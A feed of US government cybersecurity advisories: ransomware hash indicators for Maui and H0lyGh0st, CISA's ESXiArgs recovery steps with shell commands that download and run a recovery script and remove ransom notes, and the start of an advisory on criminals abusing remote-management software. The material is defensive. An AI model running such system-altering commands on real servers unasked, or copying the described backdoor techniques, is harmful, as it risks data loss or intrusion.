<td>87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6</td>
</tr><tr><td>827103a6b6185191fd5618b7e82da292</td>
<td>--</td>
</tr><tr><td>830bc975a04ab0f62bfedf27f7aca673</td>
<td>--</td>
</tr><tr><td>85995257ac07ae5a6b4a86758a2283d7</td>
<td>--</td>
</tr><tr><td>85f6e3e3f0bdd0c1b3084fc86ee59d19</td>
<td>f1576627e8130e6d5fde0dbe3dffcc8bc9eef1203d15fcf09cd877ced1ccc72a</td>
</tr><tr><td>87a6bda486554ab16c82bdfb12452e8b</td>
<td>980bb08ef3e8afcb8c0c1a879ec11c41b29fd30ac65436495e69de79c555b2be</td>
</tr><tr><td>891db50188a90ddacfaf7567d2d0355d</td>
<td>0837dd54268c373069fc5c1628c6e3d75eb99c3b3efc94c45b73e2cf9a6f3207</td>
</tr><tr><td>894de380a249e677be2acb8fbdfba2ef</td>
<td>--</td>
</tr><tr><td>8b395cc6ecdec0900facf6e93ec48fbb</td>
<td>--</td>
</tr><tr><td>92a6c017830cda80133bf97eb77d3292</td>
<td>d1aba3f95f11fc6e5fec7694d188919555b7ff097500e811ff4a5319f8f230be</td>
</tr><tr><td>9b0e7c460a80f740d455a7521f0eada1</td>
<td>45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78</td>
</tr><tr><td>9b9d4cb1f681f19417e541178d8c75d7</td>
<td>f5f6e538001803b0aa008422caf2c3c2a79b2eeee9ddc7feda710e4aba96fea4</td>
</tr><tr><td>a1f9e9f5061313325a275d448d4ddd59</td>
<td>dfdd72c9ce1212f9d9455e2bca5a327c88d2d424ea5c086725897c83afc3d42d</td>
</tr><tr><td>a452a5f693036320b580d28ee55ae2a3</td>
<td>99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f</td>
</tr><tr><td>a6e1efd70a077be032f052bb75544358</td>
<td>3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878</td>
</tr><tr><td>ad4eababfe125110299e5a24be84472e</td>
<td>a557a0c67b5baa7cf64bd4d42103d3b2852f67acf96b4c5f14992c1289b55eaa</td>
</tr><tr><td>b1c1d28dc7da1d58abab73fa98f60a83</td>
<td>38491f48d0cbaab7305b5ddca64ba41a2beb89d81d5fb920e67d0c7334c89131</td>
</tr><tr><td>b6f91a965b8404d1a276e43e61319931</td>
<td>--</td>
</tr><tr><td>bdece9758bf34fcad9cba1394519019b</td>
<td>9d6de05f9a3e62044ad9ae66111308ccb9ed2ee46a3ea37d85afa92e314e7127</td>
</tr><tr><td>c3850f4cc12717c2b54753f8ca5d5e0e</td>
<td>99b448e91669b92c2cc3417a4d9711209509274dab5d7582baacfab5028a818c</td>
</tr><tr><td>c50b839f2fc3ce5a385b9ae1c05def3a</td>
<td>458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456</td>
</tr><tr><td>cf236bf5b41d26967b1ce04ebbdb4041</td>
<td>60425a4d5ee04c8ae09bfe28ca33bf9e76a43f69548b2704956d0875a0f25145</td>
</tr><tr><td>d0e203e8845bf282475a8f816340f2e8</td>
<td>f6375c5276d1178a2a0fe1a16c5668ce523e2f846c073bf75bb2558fdec06531</td>
</tr><tr><td>ddb1f970371fa32faae61fc5b8423d4b</td>
<td>dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469</td>
</tr><tr><td>f2f787868a3064407d79173ac5fc0864</td>
<td>92adc5ea29491d9245876ba0b2957393633c9998eb47b3ae1344c13a44cd59ae</td>
</tr><tr><td>fda3a19afa85912f6dc8452675245d6b</td>
<td>56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19</td>
</tr><tr><td>--</td>
<td>0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71</td>
</tr><tr><td>--</td>
<td>151ab3e05a23e9ccd03a6c49830dabb9e9281faf279c31ae40b13e6971dd2fb8</td>
</tr><tr><td>--</td>
<td>1c926fb3bd99f4a586ed476e4683163892f3958581bf8c24235cd2a415513b7f</td>
</tr><tr><td>--</td>
<td>1f8dcfaebbcd7e71c2872e0ba2fc6db81d651cf654a21d33c78eae6662e62392</td>
</tr><tr><td>--</td>
<td>f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb</td>
</tr><tr><td>--</td>
<td>23eff00dde0ee27dabad28c1f4ffb8b09e876f1e1a77c1e6fb735ab517d79b76</td>
</tr><tr><td>--</td>
<td>586f30907c3849c363145bfdcdabe3e2e4688cbd5688ff968e984b201b474730</td>
</tr><tr><td>--</td>
<td>8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5</td>
</tr><tr><td>--</td>
<td>90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4</td>
</tr><tr><td>--</td>
<td>c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f</td>
</tr><tr><td>--</td>
<td>ca932ccaa30955f2fffb1122234fb1524f7de3a8e0044de1ed4fe05cab8702a5</td>
</tr><tr><td>--</td>
<td>f6827dc5af661fbb4bf64bc625c78283ef836c6985bb2bfb836bd0c8d5397332</td>
</tr><tr><td>--</td>
<td>f78cabf7a0e7ed3ef2d1c976c1486281f56a6503354b87219b466f2f7a0b65c4</td>
</tr></tbody></table><p>Table 3 lists MD5 and SHA256 hashes are associated with Maui Ransomware files.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 3: File names and hashes of Maui ransomware files</em></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">MD5 Hash</th>
<th scope="col" role="columnheader">SHA256 Hash</th>
</tr></thead><tbody><tr><td>4118d9adce7350c3eedeb056a3335346</td>
<td>5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e</td>
</tr><tr><td>9b0e7c460a80f740d455a7521f0eada1</td>
<td>45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78</td>
</tr><tr><td>fda3a19afa85912f6dc8452675245d6b</td>
<td>56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19</td>
</tr><tr><td>2d02f5499d35a8dffb4c8bc0b7fec5c2</td>
<td>830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570</td>
</tr><tr><td>c50b839f2fc3ce5a385b9ae1c05def3a</td>
<td>458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456</td>
</tr><tr><td>a452a5f693036320b580d28ee55ae2a3</td>
<td>99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f</td>
</tr><tr><td>a6e1efd70a077be032f052bb75544358</td>
<td>3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878</td>
</tr><tr><td>802e7d6e80d7a60e17f9ffbd62fcbbeb</td>
<td>87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6</td>
</tr><tr><td>--</td>
<td>0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71</td>
</tr></tbody></table><p>Table 4 lists MD5 and SHA256 hashes associated with H0lyGh0st Ransomware files.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">SHA256 Hash</th>
</tr></thead><tbody><tr><td>99fc54786a72f32fd44c7391c2171ca31e72ca52725c68e2dde94d04c286fccd*</td>
</tr><tr><td>F8fc2445a9814ca8cf48a979bff7f182d6538f4d1ff438cf259268e8b4b76f86*</td>
</tr><tr><td>Bea866b327a2dc2aa104b7ad7307008919c06620771ec3715a059e675d9f40af*</td>
</tr><tr><td>6e20b73a6057f8ff75c49e1b7aef08abfcfe4e418e2c1307791036f081335c2d</td>
</tr><tr><td>f4d10b08d7dacd8fe33a6b54a0416eecdaed92c69c933c4a5d3700b8f5100fad</td>
</tr><tr><td>541825cb652606c2ea12fd25a842a8b3456d025841c3a7f563655ef77bb67219</td>
</tr><tr><td>2d978df8df0cf33830aba16c6322198e5889c67d49b40b1cb1eb236bd366826d</td>
</tr><tr><td>414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7</td>
</tr><tr><td>
<p>Df0c7bb88e3c67d849d78d13cee30671b39b300e0cda5550280350775d5762d8</p>
</td>
</tr></tbody></table><table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">MD5 Hash</th>
</tr></thead><tbody><tr><td>a2c2099d503fcc29478205f5aef0283b</td>
</tr><tr><td>9c516e5b95a7e4169ecbd133ed4d205f</td>
</tr><tr><td>d6a7b5db62bf7815a10a17cdf7ddbd4b</td>
</tr><tr><td>c6949a99c60ef29d20ac8a9a3fb58ce5</td>
</tr><tr><td>4b20641c759ed563757cdd95c651ee53</td>
</tr><tr><td>25ee4001eb4e91f7ea0bc5d07f2a9744</td>
</tr><tr><td>18126be163eb7df2194bb902c359ba8e</td>
</tr><tr><td>eaf6896b361121b2c315a35be837576d</td>
</tr><tr><td>e4ee611533a28648a350f2dab85bb72a</td>
</tr><tr><td>e268cb7ab778564e88d757db4152b9fa</td>
</tr></tbody></table><p>* from <a href="https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/">Microsoft blog post on h0lygh0st</a></p>
<h5><strong>CONTACT INFORMATION</strong></h5>
<p>NSA Client Requirements / General Cybersecurity Inquiries: <a href="mailto:CybersecurityReports@nsa.gov">CybersecurityReports@nsa.gov</a><br />
Defense Industrial Base Inquiries and Cybersecurity Services: <a href="mailto:DIB_Defense@cyber.nsa.gov">DIB_Defense@cyber.nsa.gov</a><br />
To report incidents and anomalous activity related to information found in this Joint Cybersecurity Advisory, contact CISA’s 24/7 Operations Center at <a href="mailto:Report@cisa.gov">Report@cisa.gov</a> or (888) 282-0870 or your local FBI field office at <a href="http://www.fbi.gov/contact-us/field">www.fbi.gov/contact-us/field</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<p>Media Inquiries / Press Desk:</p>
<ul><li>NSA Media Relations, 443-634-0721, <a href="mailto:MediaRelations@nsa.gov">MediaRelations@nsa.gov</a></li>
<li>CISA Media Relations, 703-235-2010, <a href="mailto:CISAMedia@cisa.dhs.gov">CISAMedia@cisa.dhs.gov</a></li>
</ul>
## pubDate
Thu, 16 Feb 2023 15:45:26 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17286
## -
## title
ESXiArgs Ransomware Virtual Machine Recovery Guidance
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-039a
## description
<h3>Summary</h3>
<div class="field field--name-body field--type-text-with-summary field--label-hidden field--item">
<p>The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory (CSA) in response to the ongoing ransomware campaign, known as “ESXiArgs.” Malicious actors may be exploiting known vulnerabilities in VMware ESXi servers that are likely running unpatched and out-of-service or out-of-date versions of VMware ESXi software to gain access and deploy ransomware. The ESXiArgs ransomware encrypts configuration files on ESXi servers, potentially rendering virtual machines (VMs) unusable. </p>
<p>CISA has released an ESXiArgs recovery script at <a class="ext" href="https://github.com/cisagov/ESXiArgs-Recover">github.com/cisagov/ESXiArgs-Recover</a>. Organizations that have fallen victim to ESXiArgs ransomware can use this script to attempt to recover their files. This CSA provides guidance on how to use the script.<br />
ESXiArgs actors have compromised over 3,800 servers globally. CISA and FBI encourage all organizations managing VMware ESXi servers to: </p>
<ul><li><strong>Update servers to the latest version of VMware ESXi software</strong>, </li>
<li><strong>Harden ESXi hypervisors by disabling the Service Location Protocol (SLP) service</strong>, and </li>
<li><strong>Ensure the ESXi hypervisor is not exposed to the public interne</strong>t. </li>
</ul><p>If malicious actors have compromised your organization with ESXiArgs ransomware, CISA and FBI recommend following the script and guidance provided in this CSA to attempt to recover access to your files.  </p>
<p>Download the PDF version of this report: </p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-02/aa23-039a-esxiargs-ransomware-virtual-machine-recovery-guidance.pdf" class="c-file__link" target="_blank">ESXiArgs Ransomware Virtual Machine Recovery Guidance</a>
    <span class="c-file__size">(PDF,       711.08 KB
  )</span>
  </div>
</div>
<p><strong>Note:</strong> CISA and FBI will update this CSA as more information becomes available.</p>
</div>
<p><a id="technical-details"></a></p>
<h3>Technical Details</h3>
<div class="field field--name-field-aa-technical-details field--type-text-long field--label-hidden field--item">
<p>Open-source reporting indicates that malicious actors are exploiting known vulnerabilities in VMware ESXi software to gain access to servers and deploy ESXiArgs ransomware. The actors are likely targeting end-of-life ESXi servers or ESXi servers that do not have the available ESXi software patches applied.<a class="ext" href="https://blogs.vmware.com/security/2023/02/83330.html">[1]</a> </p>
<p>ESXiArgs ransomware encrypts certain configuration files on ESXi servers, potentially rendering VMs unusable. Specifically, the ransomware encrypts configuration files associated with the VMs; it does not encrypt flat files. As a result, it is possible, in some cases, for victims to reconstruct the encrypted configuration files based on the unencrypted flat file. The recovery script documented below automates the process of recreating configuration files. The full list of file extensions encrypted by the malware is: <code>vmdk</code>, <code>vmx</code>, <code>vmxf</code>, <code>vmsd</code>, <code>vmsn</code>, <code>vswp</code>, <code>vmss</code>, <code>nvram</code>, <code>vmem</code>.</p>
<h3>Recovery Guidance</h3>
<p>CISA and FBI do not encourage paying the ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, CISA and FBI urge you to promptly report ransomware incidents to a <a href="https://www.fbi.gov/contact-us/field-offices">local FBI Field Office</a>, or to CISA at <a href="https://edit-testint.cisa.gov/report">cisa.gov/report</a>. </p>
<p>CISA is providing these steps to enable organizations to attempt recovery of their VMs. CISA’s GitHub ESXiArgs recovery script, which also outlines these steps, is available at <a class="ext" href="https://github.com/cisagov/ESXiArgs-Recover">github.com/cisagov/ESXiArgs-Recover</a>. CISA is aware that some organizations have reported success in recovering files without paying ransoms. CISA’s script is based on findings published by third-party researchers.<a class="ext" href="https://enes.dev/">[2]</a> </p>
<p>Any organization seeking to use CISA’s ESXiArgs recovery script should carefully review the script to determine if it is appropriate for their environment before deploying it. This script does not seek to delete the encrypted configuration files, but instead seeks to create new configuration files that enable access to the VMs. While CISA works to ensure that scripts like this one are safe and effective, this script is delivered without warranty, either implicit or explicit. Do not use this script without understanding how it may affect your system. CISA does not assume liability for damage caused by this script. <strong>Note:</strong> Organizations that run into problems with the script can create a GitHub issue at <a class="ext" href="https://github.com/cisagov/ESXiArgs-Recover/issues">https://github.com/cisagov/ESXiArgs-Recover/issues</a>; CISA will do our best to resolve concerns.</p>
<ol><li><strong>Quarantine or take affected hosts offline</strong> to ensure that repeat infection does not occur.</li>
<li><strong>Download CISA’s recovery script</strong> and save it as <code>/tmp/recover.sh</code>.<br />
	For example, with <code>wget</code>: <code>wget -O /tmp/recover.sh</code> <code>https://raw.githubusercontent.com/cisagov/ESXiArgs-Recover/main/recover.sh.</code></li>
<li><strong>Give the script execute permissions:</strong> <code>chmod +x /tmp/recover.sh</code></li>
<li><strong>Navigate to the folder of a VM you would like to recover and run</strong> <code>ls</code> <strong>to view the files</strong>.
<ul><li><strong>Note:</strong> You may browse these folders by running <code>ls /vmfs/volumes/datastore1</code>. For instance, if the folder is called <code>example</code>, run <code>cd /vmfs/volumes/datastore1/example</code>.</li>
</ul></li>
<li><strong>View files by running</strong> <code>ls</code>. Note the name of the VM (via naming convention: <code>[name].vmdk</code>).</li>
<li><strong>Run the recovery script</strong> with <code>/tmp/recover.sh [name]</code>, where <code>[name]</code> is the name of the VM determined previously. 
<ul><li>If the VM is a thin format, run <code>/tmp/recover.sh [name] thin</code>.</li>
<li>If successful, the recovery script will output that it has successfully run. If unsuccessful, it may not be possible for the recovery script to recover your VMs; consider engaging external incident response help.</li>
</ul></li>
<li>If the script succeeded, <strong>re-register the VM</strong>.
<ol><li>If the ESXi web interface is inaccessible, <strong>remove the ransom note and restore</strong> access via the following steps. (<strong>Note:</strong> Taking the steps below moves the ransom note to the file ransom.html. Consider archiving this file for future incident review.)
<ul><li>Run <code>cd /usr/lib/vmware/hostd/docroot/ui/ && mv index.html ransom.html && mv index1.html index.html</code>.</li>
<li>Run <code>cd /usr/lib/vmware/hostd/docroot && mv index.html ransom.html && rm index.html && mv index1.html index.html</code>.</li>
<li><strong>Reboot the ESXi server</strong> (e.g., with the <code>reboot</code> command). After a few minutes, you should be able to navigate to the web interface.</li>
<li>In the ESXi web interface, <strong>navigate to the Virtual Machines page</strong>.</li>
<li>If the VM you restored already exists, right click on the VM and select <code>Unregister</code> (see figure 1).</li>
</ul></li>
</ol></li>
</ol><figure class="c-figure c-figure--medium c-figure--image u-align-center" role="group"><div class="c-figure__media">  <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/medium/public/2023-02/aa23-039a_figure_1_unregistering_the_virtual_machine.png?itok=X4tb4gvK" width="639" height="800" alt="Figure 1: Unregistering the virtual machine" /></div>
  </figure><p>Figure 1: Unregistering the virtual machine.</p>
<ul><li>Select <code>Create / Register VM</code> (see figure 2).</li>
<li>Select <code>Register an existing virtual machine</code> (see figure 2).</li>
</ul><figure class="c-figure c-figure--medium c-figure--image u-align-center" role="group"><div class="c-figure__media">  <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/medium/public/2023-02/aa23-039a_figure_2.png?itok=dxxAMkjg" width="800" height="236" alt="Figure 2: Registering the virtual machine, selecting machine to register." /></div>
  </figure><p>Figure 2: Registering the virtual machine, selecting machine to register.</p>
<p>Click <code>Select one or more virtual machines, a datastore or a directory</code> to navigate to the folder of the VM you restored. Select the <code>vmx</code> file in the folder (see figure 3).</p>
  
  
  
  
<figure class="c-figure c-figure--medium c-figure--image u-align-center" role="group"><div class="c-figure__media">  <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/medium/public/2023-02/aa23-039a_figure_3.png?itok=A6jW48vo" width="800" height="503" alt="Figure 3: Registering the virtual machine, finalizing registration." /></div>
  </figure><p>Figure 3: Registering the virtual machine, finalizing registration.</p>
<p>Select <code>Next</code> and <code>Finish</code>. You should now be able to use the VM as normal.</p>
<p>Figure 3: Registering the virtual machine, finalizing registration.</p>
<p>Select Next and Finish. You should now be able to use the VM as normal.</p>
<ol start="8"><li><strong>Update servers to the latest software version, disable the Service Location Protocol (SLP) service, and ensure the ESXi hypervisor is not configured to be exposed to the public internet</strong> before putting systems back online. </li>
</ol><h4>Additional Incident Response</h4>
<p>The above script only serves as a method to recover essential services. Although CISA and FBI have not seen any evidence that the actors have established persistence, we recommend organizations take the following additional incident response actions after applying the script:</p>
<ol><li>Review network logging to and from ESXi hosts and the guest VMs for unusual scanning activity.</li>
<li>Review traffic from network segments occupied by the ESXi hosts and guests. Consider restricting non-essential traffic to and from these segments.</li>
</ol><p>If you detect activity from the above, implement your incident response plan. CISA and FBI urge you to promptly report ransomware incidents to <a href="https://www.fbi.gov/contact-us/field-offices">a local FBI Field Office</a>, or to CISA at <a href="https://www.cisa.gov/report">cisa.gov/report</a>.</p>
<p>Organizations should also collect and review artifacts, such as running processes/services, unusual authentications, and recent network connections.</p>
<p>See the joint CSA from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States on <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a">Technical Approaches to Uncovering and Remediating Malicious Activity</a> for additional guidance on hunting or investigating a network, and for common mistakes in incident handling. CISA also encourages government network administrators to see CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to federal civilian branch agencies, these playbooks provide operational procedures for planning and conducting cybersecurity incident and vulnerability response activities and detail steps for both incident and vulnerability response.  </p>
<p>Additional resources for recovering <code>.vmdk</code> files can be found on a third-party researcher’s website.<a class="ext" href="https://enes.dev/">[2]</a></p>
</div>
<p><a id="mitigations"></a></p>
<h3>Mitigations</h3>
<div class="field field--name-field-aa-mitigations field--type-text-long field--label-hidden field--item">
<p><strong>Note:</strong> These mitigations align with the cross-sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. For more information on the CPGs, including additional recommended baseline protections, see <a href="https://www.cisa.gov/cpg">cisa.gov/cpg</a>.</p>
<p>CISA and FBI recommend all organizations: </p>
<ul><li>Temporarily remove connectivity for the associated ESXi server(s).
<ul><li><strong>Upgrade your ESXi servers to the latest version of VMware ESXi software</strong> <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 5.1]</a>. ESXi releases are cumulative, and the latest builds are documented in VMware’s article, Build numbers and versions of VMware ESXi/ESX.</li>
<li><strong>Harden ESXi hypervisors by disabling the Service Location Protocol (SLP) service</strong>, which ESXiArgs may leverage. For more information on executing workarounds, see VMware’s guidance <a class="ext" href="https://kb.vmware.com/s/article/76372">How to Disable/Enable the SLP Service on VMware ESXi</a>. </li>
<li><strong>Ensure your ESXi hypervisor is not configured to be exposed to the public internet.</strong></li>
</ul></li>
</ul><p>In addition, CISA and FBI recommend organizations apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.</p>
<h3>Preparing for Ransomware</h3>
<ul><li>Maintain offline backups of data, and regularly test backup and restoration <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 7.3]</a>. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.</li>
<li>Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
<li>Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response procedures for a ransomware incident <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 7.1, 7.2]</a>.</li>
</ul><h3> Mitigating and Preventing Ransomware</h3>
<ul><li>Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.</li>
<li><a href="https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf">Require phishing-resistant MFA</a> for as many services as possible <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 1.3]</a>—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.</li>
<li>Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.</li>
<li>Implement allow-listing policies for applications and remote access that only allow systems to execute known and permitted programs.</li>
<li>Open document readers in protected viewing modes to help prevent active content from running.</li>
<li>Implement user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails.</li>
<li>Use strong passwords <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 1.4]</a> and avoid reusing passwords for multiple accounts. See CISA Tip <a href="https://www.cisa.gov/tips/st04-002">Choosing and Protecting Passwords</a> and the NIST’s <a href="https://csrc.nist.gov/publications/detail/sp/800-63b/final">Special Publication 800-63B: Digital Identity Guidelines</a> for more information.</li>
<li>Require administrator credentials to install software <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 1.5]</a>.</li>
<li>Audit user accounts with administrative or elevated privileges and configure access controls with least privilege in mind <a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">[CPG 1.5]</a>.</li>
<li>Install and regularly update antivirus and antimalware software on all hosts.</li>
<li>Consider adding an email banner to messages coming from outside your organizations.</li>
<li>Disable hyperlinks in received emails.</li>
<li><strong>Consider participating in CISA’s no-cost</strong> <a href="https://www.cisa.gov/ais">Automated Indicator Sharing (AIS) program</a> to receive real-time exchange of machine-readable cyber threat indicators and defensive measures. </li>
</ul><h3>Responding to Ransomware Incidents</h3>
<p>If a ransomware incident occurs at your organization:</p>
<ul><li>Follow your organization’s Ransomware Response Checklist (see Preparing for Ransomware section).</li>
<li>Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.</li>
<li>Follow the notification requirements as outlined in your cyber incident response plan.</li>
<li>Report incidents to CISA at <a href="https://www.cisa.gov/report">cisa.gov/report</a>, FBI at a <a href="https://www.fbi.gov/contact-us/field-offices">local FBI Field Office</a>, or the U.S. Secret Service (USSS) at a <a href="http://www.secretservice.gov/contact/field-offices/">USSS Field Office</a>.</li>
<li>Apply incident response best practices found in the joint Cybersecurity Advisory, <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a">Technical Approaches to Uncovering and Remediating Malicious Activity</a>, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.</li>
</ul><p><strong>Note:</strong> CISA and FBI strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities.</p>
<h3>Resources </h3>
<p>See <a href="https://www.cisa.gov/stopransomware">Stopransomware.gov</a>, a whole-of-government approach, for ransomware resources and alerts.</p>
<h3>Acknowledgements</h3>
<p>CISA and FBI would like to thank VMware for their contributions to this CSA.</p>
</div>
<p><a id="references"></a></p>
<h3>References</h3>
<div class="field field--name-field-aa-references field--type-link field--label-hidden field--items">
<div class="field--item"><a class="ext" href="https://blogs.vmware.com/security/2023/02/83330.html">VMware Security Response Center (vSRC) Response to 'ESXiArgs' Ransomware Attack…</a></div>
<div class="field--item"><a class="ext" href="https://enes.dev/">Enes Sonmez and Ahmet Aykac, YoreGroup Tech Team: decrypt your crypted files in…</a></div>
</div>
<p><a id="revisions"></a></p>
<h3>Revisions</h3>
<div class="field field--name-field-aa-revisions field--type-string field--label-hidden field--items">
<div class="field--item">February, 2023: Initial Version</div>
</div>

## pubDate
Thu, 16 Feb 2023 13:50:04 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17270
## -
## title
Protecting Against Malicious Use of Remote Monitoring and Management Software
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a
## description
<div>
<h3>Summary</h3>
</div>
<p>The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Multi-State Information Sharing and Analysis Center (MS-ISAC) (hereafter referred to as the “authoring organizations”) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders about malicious use of legitimate remote monitoring and management (RMM) software. In October 2022, CISA identified a widespread cyber campaign involving the malicious use of legitimate RMM software. Specifically, cyber criminal actors sent phishing emails that led to the download of legitimate RMM software—ScreenConnect (now ConnectWise Control) and AnyDesk—which the actors used in a refund scam to steal money from victim bank accounts.</p>
<p>Although this campaign appears financially motivated, the authoring organizations assess it could lead to additional types of malicious activity. For example, the actors could sell victim account access to other cyber criminal or advanced persistent threat (APT) actors. This campaign highlights the threat of malicious cyber activity associated with legitimate RMM software: after gaining access to the target network via phishing or other techniques, malicious cyber actors—from cybercriminals to nation-state sponsored APTs—are known to use legitimate RMM software as a backdoor for persistence and/or command and control (C2).</p>
<p>Using portable executables of RMM software provides a way for actors to establish local user access without the need for administrative privilege and full software installation—effectively bypassing common software controls and risk management assumptions.</p>
<p>The authoring organizations strongly encourage network defenders to review the Indicators of Compromise (IOCs) and Mitigations sections in this CSA and apply the recommendations to protect against malicious use of legitimate RMM software.</p>
<p>Download the PDF version of this report: <a href="https://www.cisa.gov/sites/default/files/2023-02/aa23-025a-protecting-against-malicious-use-of-rmm-software.pdf" title="Protecting Against Malicious Use of Remote Monitoring and Management Software">pdf, 608 kb</a>.</p>
<p>For a downloadable copy of IOCs, see <a href="https://www.cisa.gov/sites/default/files/2023-02/AA23-025A.stix_.xml" title="Protecting Against Malicious Use of Remote Monitoring and Management Software (STIX)">AA23-025.stix (STIX, 19 kb)</a>.</p>
<div>
<h3>Technical Details</h3>
</div>
<h4><strong>Overview</strong></h4>
<p>In October 2022, CISA used trusted third-party reporting, to conduct retrospective analysis of <a href="https://www.cisa.gov/einstein">EINSTEIN</a>—a federal civilian executive branch (FCEB)-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected malicious activity on two FCEB networks:</p>
<ul><li>In mid-June 2022, malicious actors sent a phishing email containing a phone number to an FCEB employee’s government email address. The employee called the number, which led them to visit the malicious domain, myhelpcare[.]online.</li>
<li>In mid-September 2022, there was bi-directional traffic between an FCEB network and myhelpcare[.]cc.</li>
</ul><p>Based on further EINSTEIN analysis and incident response support, CISA identified related activity on many other FCEB networks. The authoring organizations assess this activity is part of a widespread, financially motivated phishing campaign and is related to malicious typosquatting activity reported by Silent Push in the blog post <a href="https://www.silentpush.com/blog/silent-push-uncovers-a-large-phishing-operation-featuring-amazon-geek-squad-mcafee-microsoft-norton-and-paypal-domains">Silent Push uncovers a large trojan operation featuring Amazon, Microsoft, Geek Squad, McAfee, Norton, and Paypal domains</a>.</p>
